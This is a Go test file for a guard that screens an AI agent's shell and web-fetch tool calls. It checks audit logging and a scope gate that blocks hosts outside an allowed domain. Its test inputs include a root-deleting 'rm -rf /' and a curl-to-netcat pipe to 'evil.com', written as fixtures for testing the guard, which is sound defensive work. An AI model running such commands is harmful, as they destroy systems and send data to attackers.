package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

func TestScopeGateBlocksOutsideHost(t *testing.T) {
	g := New()
	g.SetScopeGate(func(_ context.Context, tool string, input json.RawMessage) (bool, string) {
		for _, h := range NetworkTargets(tool, input) {
			if h != "example.com" && h != "www.example.com" {
				return true, "目标不在本任务范围内：" + h
			}
		}
		return false, ""
	})
	input, _ := json.Marshal(map[string]string{"command": "curl https://other.test/"})
	blocked, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
	if !blocked {
		t.Fatal("host outside the gate should be blocked")
	}
	inside, _ := json.Marshal(map[string]string{"url": "https://www.example.com/"})
	blocked, _, _ = g.Hooks().PreToolUse(context.Background(), "WebFetch", inside)
	if blocked {
		t.Fatal("in-scope WebFetch should pass the gate")
	}
	local, _ := json.Marshal(map[string]string{"command": "ls notes"})
	blocked, _, _ = g.Hooks().PreToolUse(context.Background(), "Bash", local)
	if blocked {
		t.Fatal("a command with no remote host should pass the gate")
	}
}

var _ = hook.PreToolUse
